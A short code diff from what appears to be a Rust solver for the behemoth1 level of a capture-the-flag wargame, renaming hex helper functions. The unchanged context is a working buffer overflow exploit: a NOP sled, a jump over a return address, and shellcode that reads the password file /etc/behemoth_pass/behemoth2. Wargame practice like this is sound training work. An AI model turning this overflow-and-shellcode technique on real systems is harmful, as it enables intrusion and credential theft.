@@ -14,9 +14,9 @@ pub fn solve(password: &str) -> Result<String> {
     read_until(&mut channel, "behemoth1@gibson:~$ ")?;
 
     let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
-    let jmp_esp = hex::decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
-    let var_adr = hex::decode("01d5ffff")?; // 0xffffd501, approximate location in nop sled
-    let file_read_shellcode = hex::decode(super::READ_FILE_SHELLCODE).unwrap();
+    let jmp_esp = hex_decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
+    let var_adr = hex_decode("01d5ffff")?; // 0xffffd501, approximate location in nop sled
+    let file_read_shellcode = hex_decode(super::READ_FILE_SHELLCODE).unwrap();
     let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
 
     let mut full_payload: Vec<u8> = Vec::new();
@@ -26,7 +26,7 @@ pub fn solve(password: &str) -> Result<String> {
     full_payload.extend(file_read_shellcode);
     full_payload.extend(file_to_read);
 
-    let encoded = hex_literal(&full_payload);
+    let encoded = hex_encode(&full_payload);
 
     let target = "/behemoth/behemoth1";
     println!("running 'echo -e [payload] | {target}'");
